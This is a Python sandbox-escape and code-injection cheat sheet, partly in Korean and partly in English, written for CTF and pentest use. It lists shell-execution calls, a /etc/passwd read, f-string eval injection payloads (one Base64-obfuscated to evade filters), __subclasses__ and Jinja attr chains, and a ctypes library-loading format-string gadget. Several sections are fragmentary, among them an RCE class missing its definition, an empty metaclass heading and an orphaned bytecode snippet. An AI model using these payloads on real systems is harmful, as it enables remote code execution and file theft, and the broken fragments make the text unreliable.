## Command Execution Libraries

가장 먼저 알아야 할 것은 이미 import된 어떤 library를 사용해 직접 code를 execute할 수 있는지, 또는 이들 library 중 하나를 import할 수 있는지입니다:
```python
os.system("ls")
os.popen("ls").read()
commands.getstatusoutput("ls")
commands.getoutput("ls")
commands.getstatus("file/path")
subprocess.call("ls", shell=True)
subprocess.Popen("ls", shell=True)
pty.spawn("ls")
pty.spawn("/bin/bash")
platform.os.system("ls")
pdb.os.system("ls")

#Import functions to execute commands
importlib.import_module("os").system("ls")
importlib.__import__("os").system("ls")
imp.load_source("os","/usr/lib/python3.8/os.py").system("ls")
imp.os.system("ls")
imp.sys.modules["os"].system("ls")
sys.modules["os"].system("ls")
__import__("os").system("ls")
import os
from os import *

#Other interesting functions
open("/etc/passwd").read()
open('/var/www/html/input', 'w').write('123')

#In Python2.7
execfile('/usr/lib/python2.7/os.py')
system('ls')
```
Remember that the _**open**_ and _**read**_ functions can be useful to **read files** inside the python sandbox and to **write some code** that you could **execute** to **bypass** the sandbox.

> [!CAUTION] > **Python2 input()** function allows executing python code before the program crashes.

Python try to **load libraries from the current directory first** (the following command will print where is python loading modules from): `python3 -c 'import sys; print(sys.path)'`

### F-string 재평가 sink

다른 종류이지만 매우 흔한 버그는 **공격자가 제어하는 데이터를 문자열에 삽입한 뒤 그 문자열을 f-string으로 평가하는 것**입니다. 이는 **Jinja/SSTI**가 아니며, Python interpreter 자체가 두 번째 평가 단계에서 `{...}` 안에 들어간 모든 것을 실행합니다:
```python
def template(first, last, gender):
text = f"Patient {first} {last} ({gender})"
return eval(f"f'''{text}'''")
```

```python
s = "2+3"
eval(f"f'''{s}'''")
# '2+3'

s = "{2+3}"
eval(f"f'''{s}'''")
# '5'
```
따라서 중괄호, 따옴표, 점, 밑줄, 괄호가 허용된다면, 다음과 같은 payload는 보통 command execution을 가능하게 합니다:
```python
{__import__("os").popen("id").read()}
```
공백이나 shell 메타문자가 필터링되면, command를 Base64로 감싸서 expression 내부에서 디코딩하세요:
```python
{__import__("os").popen(__import__("base64").b64decode("aWQK").decode()).read()}
```
유용한 헌팅 패턴:

- `eval(f"f'''{user_input}'''")`
- `eval(f'f"{user_input}"')`
- 사용자 데이터로 템플릿을 만든 다음, 재구성된 문자열에 대해 `eval`, `exec`, 또는 `compile`을 호출하는 코드
- regex로 문자를 검증하지만 `{}`와 따옴표는 여전히 허용하는 XML/JSON 핸들러

### RCE creating objects and overloading

**class**를 선언하고 그 class의 **object**를 생성할 수 있다면, **직접 호출할 필요 없이** **trigger**될 수 있는 서로 다른 methods를 **write/overwrite**할 수 있습니다.

#### RCE with custom classes

일부 **class methods**를 (기존 class methods를 덮어쓰거나 새 class를 만들어) 수정해서, 이를 직접 호출하지 않고도 **trigger**될 때 **arbitrary code**를 **execute**하도록 만들 수 있습니다.

```python
__getitem__ = exec #Trigerred with obj[<argument>]

# These lines abuse directly the previous class to get RCE
rce = RCE() #Later we will see how to create objects without calling the constructor
rce["print('Hello from __getitem__')"]
rce + "print('Hello from __add__')"
```

#### [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)로 객체 생성하기

```python
# Note: Metaclass.__class__ == type
```

### No Builtins

`__builtins__`가 없으면 아무것도 import할 수 없고, 파일을 읽거나 쓸 수도 없습니다. **모든 global function**(`open`, `import`, `print`...)이 **로드되지 않기** 때문입니다.\
하지만 **기본적으로 python은 많은 module을 memory에 import**합니다. 이런 module들은 무해해 보일 수 있지만, 그중 일부는 내부에 **위험한** 기능도 **import**하고 있으며, 이를 이용해 **arbitrary code execution**까지 얻을 수 있습니다.

## Arbitrary Execution 발견

여기서는 **더 위험한 기능들이 로드되어 있는 것**을 쉽게 발견하는 방법과 더 신뢰할 수 있는 exploit을 제안하는 방법을 설명하고자 합니다.

#### bypasses를 사용한 subclasses 접근

이 technique에서 가장 민감한 부분 중 하나는 **base subclasses**에 접근할 수 있는 것입니다. 이전 예시에서는 `''.__class__.__base__.__subclasses__()`를 사용했지만, **다른 가능한 방법들도 있습니다**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
```

### From format to RCE loading libraries

According to the [**TypeMonkey chall from this writeup**](https://corgi.rip/posts/buckeye-writeups/) it's possible to load arbitrary libraries from disk abusing the format string vulnerability in python.

As reminder, every time an action is performed in python some function is executed. For example `2*3` will execute **`(2).mul(3)`** or `{'a':'b'}['a']` will be **`{'a':'b'}.__getitem__('a')`**.

You have more like this in the section [**Python execution without calls**](#python-execution-without-calls).

A python format string vuln doesn't allow to execute function (it's doesn't allow to use parenthesis), so it's not possible to get RCE like `'{0.system("/bin/sh")}'.format(os)`.\
However, it's possible to use `[]`. Therefore, if a common python library has a **`__getitem__`** or **`__getattr__`** method that executes arbitrary code, it's possible to abuse them to get RCE.

Looking for a gadget like that in python, the writeup purposes this [**Github search query**](https://github.com/search?q=repo%3Apython%2Fcpython+%2Fdef+%28__getitem__%7C__getattr__%29%2F+path%3ALib%2F+-path%3ALib%2Ftest%2F&type=code). Where he found this [one](https://github.com/python/cpython/blob/43303e362e3a7e2d96747d881021a14c7f7e3d0b/Lib/ctypes/__init__.py#L463):
```python
class LibraryLoader(object):
def __init__(self, dlltype):
self._dlltype = dlltype

def __getattr__(self, name):
if name[0] == '_':
raise AttributeError(name)
try:
dll = self._dlltype(name)
except OSError:
raise AttributeError(name)
setattr(self, name, dll)
return dll

def __getitem__(self, name):
return getattr(self, name)

cdll = LibraryLoader(CDLL)
pydll = LibraryLoader(PyDLL)
```
이 gadget은 **디스크에서 library를 load**할 수 있게 해줍니다. 따라서 공격받는 서버에 **올바르게 컴파일된 load할 library를 write하거나 upload**해야 합니다.
```python
'{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
```
The challenge actually abuses another vulnerability in the server that allows to create arbitrary files in the servers disk.

```python
names = ('open','read')

# And execute it using eval/exec
eval(code_type(0, 0, 3, 64, bytecode, consts, names, (), 'noname', '<module>', 1, '', (), ()))

#You could also execute it directly

```

### Assert

`-O` 파라미터로 optimizations와 함께 실행된 Python은 asset statements와 **debug** 값에 따라 조건부인 모든 코드를 제거한다.\
따라서, 다음과 같은 체크는
```python
def check_permission(super_user):
try:
assert(super_user)
print("\nYou are a super user\n")
except AssertionError:
print(f"\nNot a Super User!!!\n")
```
will be bypassed
